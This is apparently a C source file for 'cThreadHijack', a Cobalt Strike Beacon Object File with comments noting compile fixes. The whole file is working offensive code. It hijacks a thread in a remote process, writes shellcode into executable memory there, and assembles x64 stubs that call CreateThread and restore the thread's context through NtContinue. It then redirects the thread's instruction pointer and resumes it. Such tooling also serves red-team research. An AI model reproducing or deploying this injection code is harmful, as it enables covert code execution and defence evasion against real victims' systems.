// cThreadHijack: Beacon Object File (BOF) to identify a legitimate thread within a remote process, suspend it, point the thread to shellcode, and resume/restore it
// Author: Connor McGarr (@33y0re)
// Fixed: removed local WINBASEAPI/DECLSPEC_IMPORT prototype declarations that
//        conflict with beacon_compatibility.h macros; fixed DWORD payloadSize
//        initialisation; fixed BeaconDataExtract int* cast; fixed (DWORD64)
//        pointer arithmetic casts to (char*) for mycopy/RtlMoveMemory.

#include <Windows.h>
#include <TlHelp32.h>
#include "libc.h"
#include "beacon_compatibility.h"

void go(char* argc, int len)
{
	datap parser;
	int payloadSize = 0;   /* was: DWORD payloadSize = NULL — wrong type+value */

	BeaconDataParse(&parser, argc, len);

	int pid = BeaconDataInt(&parser);

	/* BeaconDataExtract takes int*, not DWORD* */
	char* shellcode = (char*)BeaconDataExtract(&parser, &payloadSize);

	NTSTATUS statusSuccess = (NTSTATUS)0x00000000;

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Target process PID: %d\n", pid);

	HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE,
		(DWORD)pid
	);

	if (processHandle == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to open a handle to the process. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened a handle to PID %d\n", pid);

		THREADENTRY32 lpte;
		lpte.dwSize = sizeof(THREADENTRY32);
		HANDLE desiredThread = NULL;

		HANDLE threadSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

		if (KERNEL32$Thread32First(threadSnapshot, &lpte) == TRUE)
		{
			while (KERNEL32$Thread32Next(threadSnapshot, &lpte) == TRUE)
			{
				if (lpte.th32OwnerProcessID == (DWORD)pid)
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Found a thread in the target process! Thread ID: %d\n", lpte.th32ThreadID);

					desiredThread = KERNEL32$OpenThread(
						THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT,
						FALSE,
						lpte.th32ThreadID
					);
					break;
				}
			}
		}

		KERNEL32$CloseHandle(threadSnapshot);

		BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspending the targeted thread...\n");

		DWORD suspendThread = KERNEL32$SuspendThread(desiredThread);

		CONTEXT cpuRegisters = { 0 };
		cpuRegisters.ContextFlags = CONTEXT_ALL;

		BOOL getContext = KERNEL32$GetThreadContext(desiredThread, &cpuRegisters);

		if (!getContext)
		{
			BeaconPrintf(CALLBACK_ERROR, "Error! Unable to get the state of the target thread. Error: 0x%lx\n", KERNEL32$GetLastError());
		}
		else
		{
			PVOID placeRemotely = KERNEL32$VirtualAllocEx(
				processHandle,
				NULL,
				(SIZE_T)payloadSize,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READWRITE
			);

			if (placeRemotely == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory within the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
			}
			else
			{
				BOOL writeRemotely = KERNEL32$WriteProcessMemory(
					processHandle,
					placeRemotely,
					shellcode,
					(SIZE_T)payloadSize,
					NULL
				);

				if (!writeRemotely)
				{
					BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write shellcode to allocated buffer. Error: 0x%lx\n", KERNEL32$GetLastError());
				}
				else
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote Beacon shellcode to the remote process!\n");

					BYTE createThread[64] = { 0 };   /* was: { NULL } — NULL is a pointer, not 0 */
					LPTHREAD_START_ROUTINE threadCast = (LPTHREAD_START_ROUTINE)placeRemotely;
					int z = 0;

					createThread[z++] = 0x48; createThread[z++] = 0x31; createThread[z++] = 0xc9;
					createThread[z++] = 0x48; createThread[z++] = 0x31; createThread[z++] = 0xd2;
					createThread[z++] = 0x49; createThread[z++] = 0xb8;
					mycopy((char*)createThread + z, (const char*)&threadCast, sizeof(threadCast));
					z += (int)sizeof(threadCast);
					createThread[z++] = 0x4d; createThread[z++] = 0x31; createThread[z++] = 0xc9;
					createThread[z++] = 0x4c; createThread[z++] = 0x89; createThread[z++] = 0x4c;
					createThread[z++] = 0x24; createThread[z++] = 0x20;
					createThread[z++] = 0x4c; createThread[z++] = 0x89; createThread[z++] = 0x4c;
					createThread[z++] = 0x24; createThread[z++] = 0x28;

					/* GetProcAddress returns FARPROC — store as void* to avoid
					 * integer/pointer comparison warnings */
					void* createthreadAddress = (void*)KERNEL32$GetProcAddress(
						KERNEL32$GetModuleHandleA("kernel32"), "CreateThread");

					if (createthreadAddress == NULL)
					{
						BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve CreateThread. Error: 0x%lx\n", KERNEL32$GetLastError());
					}
					else
					{
						createThread[z++] = 0x48; createThread[z++] = 0xb8;
						mycopy((char*)createThread + z, (const char*)&createthreadAddress, sizeof(createthreadAddress));
						z += (int)sizeof(createthreadAddress);
						createThread[z++] = 0xff; createThread[z++] = 0xd0;
						createThread[z++] = 0xc3;

						BYTE ntContinue[64] = { 0 };
						int i = 0;
						BYTE stackAlignment[4] = { 0 };

						ntContinue[i++] = 0xe8;
						DWORD shellcodeOffset = (DWORD)(sizeof(ntContinue) + sizeof(CONTEXT) - sizeof(DWORD) - (DWORD)i);
						mycopy((char*)ntContinue + i, (const char*)&shellcodeOffset, sizeof(shellcodeOffset));
						i += (int)sizeof(shellcodeOffset);

						ntContinue[i++] = 0xe8;
						ntContinue[i++] = 0x00; ntContinue[i++] = 0x00;
						ntContinue[i++] = 0x00; ntContinue[i++] = 0x00;

						int contextOffset = i;
						ntContinue[i++] = 0x59;
						ntContinue[i++] = 0x48; ntContinue[i++] = 0x83; ntContinue[i++] = 0xc1;
						ntContinue[i++] = (BYTE)(sizeof(ntContinue) - contextOffset);
						ntContinue[i++] = 0x48; ntContinue[i++] = 0x31; ntContinue[i++] = 0xd2;
						ntContinue[i++] = 0x48; ntContinue[i++] = 0xb8;

						void* ntcontinueAddress = (void*)KERNEL32$GetProcAddress(
							KERNEL32$GetModuleHandleA("ntdll"), "NtContinue");

						if (ntcontinueAddress == NULL)
						{
							BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve NtContinue.\n");
						}
						else
						{
							mycopy((char*)ntContinue + i, (const char*)&ntcontinueAddress, sizeof(ntcontinueAddress));
							i += (int)sizeof(ntcontinueAddress);

							ntContinue[i++] = 0x48; ntContinue[i++] = 0x83;
							ntContinue[i++] = 0xec; ntContinue[i++] = 0x20;
							ntContinue[i++] = 0xff; ntContinue[i++] = 0xd0;

							stackAlignment[0] = 0x48; stackAlignment[1] = 0x83;
							stackAlignment[2] = 0xe4; stackAlignment[3] = 0xf0;

							int finalLength = (int)(sizeof(ntContinue) + sizeof(CONTEXT) +
							                        sizeof(stackAlignment) + sizeof(createThread));

							PVOID shellcodeFinal = (PVOID)MSVCRT$malloc((SIZE_T)finalLength);

							mycopy((char*)shellcodeFinal, (const char*)ntContinue, sizeof(ntContinue));

							/* Use char* arithmetic instead of DWORD64 casts — DWORD64
							 * is an integer type; arithmetic on it is not pointer arithmetic */
							NTDLL$RtlMoveMemory(
								(char*)shellcodeFinal + sizeof(ntContinue),
								&cpuRegisters, sizeof(CONTEXT));
							mycopy((char*)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT),
							       (const char*)stackAlignment, sizeof(stackAlignment));
							mycopy((char*)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT) + sizeof(stackAlignment),
							       (const char*)createThread, sizeof(createThread));

							PVOID allocateMemory = KERNEL32$VirtualAllocEx(
								processHandle, NULL, (SIZE_T)finalLength,
								MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

							if (allocateMemory == NULL)
							{
								BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory in the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
							}
							else
							{
								BeaconPrintf(CALLBACK_OUTPUT, "[+] Virtual memory allocated at 0x%llx inside of the remote process!\n", (unsigned long long)allocateMemory);

								BOOL writeMemory = KERNEL32$WriteProcessMemory(
									processHandle, allocateMemory,
									shellcodeFinal, (SIZE_T)finalLength, NULL);

								if (!writeMemory)
								{
									BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write memory to the buffer. Error: 0x%lx\n", KERNEL32$GetLastError());
								}
								else
								{
									BeaconPrintf(CALLBACK_OUTPUT,
										"[+] NtContinue: %lu  CONTEXT: %lu  alignment: %lu  CreateThread: %lu  shellcode: %d bytes\n",
										(DWORD)sizeof(ntContinue), (DWORD)sizeof(CONTEXT),
										(DWORD)sizeof(stackAlignment), (DWORD)sizeof(createThread),
										payloadSize);

									cpuRegisters.Rsp -= 0x2000;
									cpuRegisters.Rip  = (DWORD64)allocateMemory;

									BOOL setRip = KERNEL32$SetThreadContext(desiredThread, &cpuRegisters);

									if (!setRip)
									{
										BeaconPrintf(CALLBACK_ERROR, "Error! Unable to set RIP. Error: 0x%lx\n", KERNEL32$GetLastError());
									}
									else
									{
										BeaconPrintf(CALLBACK_OUTPUT, "[+] RIP set to 0x%llx — resuming thread.\n", (unsigned long long)cpuRegisters.Rip);
										KERNEL32$ResumeThread(desiredThread);
									}
								}
							}
							MSVCRT$free(shellcodeFinal);
						}
					}
				}
			}
		}

		KERNEL32$CloseHandle(desiredThread);
	}

	KERNEL32$CloseHandle(processHandle);
}